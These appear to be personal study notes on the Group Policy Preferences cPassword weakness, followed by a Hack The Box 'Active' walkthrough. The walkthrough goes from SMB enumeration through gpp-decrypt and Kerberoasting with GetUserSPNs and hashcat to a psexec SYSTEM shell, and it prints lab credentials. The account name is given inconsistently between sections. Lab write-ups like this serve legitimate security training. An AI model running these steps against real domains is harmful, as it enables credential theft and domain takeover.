  

# GPP Overview

### **Group Policy Preferences (GPP) Attack Overview**

**Vulnerability**:

- Administrators previously used Group Policy Preferences (GPP) to embed credentials within policy files.
- These credentials were encrypted in an XML file within a `CPassword` field.
- The encryption key for `CPassword` was leaked publicly, allowing decryption of credentials.

**Patch Information**:

- Patched in **MS14-025** (2014), which stopped storing credentials in GPPs going forward.
- However, **historical credentials remain vulnerable** if created prior to the patch.

---

### **Attack Details**

1. **Scenario**:
    - If an unpatched system stored credentials in GPP, they can be exploited.
    - Commonly embedded credentials are **Domain Admin** accounts, leading to privilege escalation.
2. **Prerequisites**:
    - Access to **any domain user account** to read GPP XML files.
    - Ability to decrypt `CPassword` values using publicly available tools.
3. **Attack Process**:
    - Locate GPP XML files (typically within SYSVOL).
    - Identify and extract the `CPassword` field.
    - Decrypt the credentials using tools like `gpp-decrypt` (built into Kali Linux).

---

### **Steps to Exploit**

1. **Identify Vulnerable GPP Files**:
    - Use Metasploit module `post/windows/gather/credentials/gpp`.
    - Alternatively, manually search `SYSVOL` for XML files with `CPassword`.
2. **Extract Credentials**:
    - Locate the `CPassword` in the XML file.
    - Use the `gpp-decrypt` tool:
        
        ```Shell
        gpp-decrypt <CPassword>
        ```
        
3. **Metasploit Usage**:
    - With a shell on the target machine:
        
        ```Shell
        run post/windows/gather/credentials/gpp
        ```
        
4. **Verify Decrypted Password**:
    - Use the decrypted credentials to escalate privileges.

---

### **Key Notes**

- **Post-Exploitation**:
    - This attack works **only after obtaining a valid domain user account**.
    - Leverage read permissions on SYSVOL to access the XML files.
- **Legacy Systems**:
    - Server 2012 and older systems are more likely to be affected.
- **Practical Lab**:
    - Examples of GPP attacks can be tested using the Hack The Box machine "Active".

---

### **Tools and Commands**

- `**gpp-decrypt**`:
    - Built-in tool in Kali Linux for decrypting the `CPassword`.
- **Metasploit Module**:
    - `post/windows/gather/credentials/gpp` for automating the process.
- **SYSVOL Path**:
    - Vulnerable XML files are located in:
        
        ```Plain
        \\<domain_name>\SYSVOL\<domain_name>\Policies\
        ```
        

---

# Abusing GPP Part 1

Here are the notes summarizing the walkthrough of the "Active" machine from Hack the Box, focusing on **GPP exploitation** and key steps. Saved as a markdown file for easy reference.

---

### **Hack the Box: "Active" Machine Walkthrough**

### **Machine Overview**

- IP Address: `10.10.10.x`
- Purpose: Demonstrates an older **Group Policy Preferences (GPP)** exploitation attack.
- Tools Covered:
    - **SMB Enumeration**
    - GPP Decryption: `gpp-decrypt` (Kali Linux)
    - Commands for navigating and retrieving credentials.

---

### **Part 1: Enumeration**

1. **Initial Scanning**:
    - Use **Nmap** to identify open ports and services:
        
        ```Shell
        nmap -T5 -p- -sV 10.10.10.100
        ```
        
    - Key Ports of Interest:
        - `445` (SMB)
        - `88` (Kerberos)
        - Domain indicators like DNS (port `53`), LDAP, or Active Directory-related ports.
2. **SMB Enumeration**:
    - Check for shared folders:
        
        ```Shell
        smbclient -L \\10.10.10.100
        ```
        
    - Access the **Replication** share:
        
        ```Shell
        smbclient \\10.10.10.100\Replication -N
        ```
        
3. **Identify Vulnerable Files**:
    - Locate the file `Groups.xml` in the replication folder:
        
        ```Shell
        smb: \> get Groups.xml
        ```
        

---

### **Part 2: Exploiting the GPP Vulnerability**

1. **Decrypting Credentials**:
    - Extract the `CPassword` field from `Groups.xml`.
    - Decrypt the stored password using `gpp-decrypt`:
        
        ```Shell
        gpp-decrypt <CPassword>
        ```
        
2. **Example Decrypted Output**:
    - Username: `Active.htb\Service`
    - Password: `GPPStillStandingStrong2k18`

---

### **Part 3: Using Obtained Credentials**

1. **Post-Exploitation Enumeration**:
    - Authenticate using obtained credentials.
    - Map shares:
        
        ```Shell
        smbclient \\10.10.10.100\Users -U Active.htb\Service
        ```
        
2. **Challenge**:
    - The account is **not privileged**. Explore potential attacks for privilege escalation.
    - Use any learned techniques to escalate to domain admin rights.

---

### **Key Takeaways**

- **Vulnerability Origin**:
    - GPP allows embedding of passwords into `Groups.xml` files, retrievable by domain users.
    - The vulnerability exists on older systems (e.g., Windows Server 2012).
- **Tools & Alternatives**:
    - Automated alternatives include:
        - Metasploit: `post/windows/gather/credentials/gpp`
        - PowerShell Script: `Invoke-GPP`
- **Common Targets**:
    - Shared folders (e.g., `Replication`).
    - Files like `Groups.xml`.

---

# Abusing GPP Part 2

---

### **Hack the Box: Active Machine - Part 2**

### **Key Steps to Perform Kerberoasting**

1. **Credentials at Hand**:
    - Username: `Active.htb\ServiceTGS`
    - Password: `GPPStillStandingStrong2k18`
    - The credentials have been successfully decrypted using the GPP exploit from `Groups.xml`.

---

### **Performing Kerberoasting**

1. **Enumerate Kerberos SPNs**:
    - Use `GetUserSPNs` to query the Kerberos ticket of the `ServiceTGS` user:
        
        ```Shell
        GetUserSPNs.py -request -dc-ip <IP_address> <domain>/<username> -p <password>
        ```
        
    - Replace `<IP_address>` with `10.10.10.100`, `<domain>` with `Active.htb`, `<username>` with `ServiceTGS`, and `<password>` with the obtained password.
    - Example:
        
        ```Shell
        GetUserSPNs.py -request -dc-ip 10.10.10.100 Active.htb/ServiceTGS -p GPPStillStandingStrong2k18
        ```
        
    - **Result**: A Kerberos service ticket hash (TGS-REP) is output.
2. **Cracking the Service Ticket**:
    - Save the ticket into a text file (e.g., `hashes.txt`).
    - Crack the hash with Hashcat using the Kerberoasting module:
        
        ```Shell
        hashcat -m 13100 hashes.txt rockyou.txt -O
        ```
        
    - Parameters:
        - `m 13100`: Specifies Kerberos 5 TGS-REP encryption.
        - `O`: Enables performance optimization.
        - `rockyou.txt`: A common password dictionary.
    - **Result**: Decrypted password:
        
        ```Plain
        TicketMaster1968
        ```
        
3. **Access Using Cracked Password**:
    - User: `Administrator`
    - Password: `TicketMaster1968`

---

### **Privilege Escalation**

1. **Verify Access**:
    - Use PSExec to authenticate:
        
        ```Shell
        psexec.py <domain>/<username>:'<password>'@<IP_address>
        ```
        
    - Example:
        
        ```Shell
        psexec.py Administrator:'TicketMaster1968'@10.10.10.100
        ```
        
    - Confirm successful escalation:**Output**:
        
        ```Shell
        whoami
        ```
        
        ```Plain
        NT Authority\System
        ```
        
2. **Kerberoasting Takeaway**:
    - Even low-level user credentials can provide domain admin rights if misconfigurations exist.
    - Kerberoasting exploits mismanaged Service Principal Names (SPNs) and weak passwords in Kerberos authentication.

---

### **Final Thoughts**

- Attacks like **Kerberoasting** and **GPP Decryption** emphasize the importance of:
    - Avoiding weak or shared passwords.
    - Regular auditing for SPN exposures.
    - Least-privilege principles for service accounts.
- Next steps:
    - Explore **Mimikatz** for further post-exploitation.

---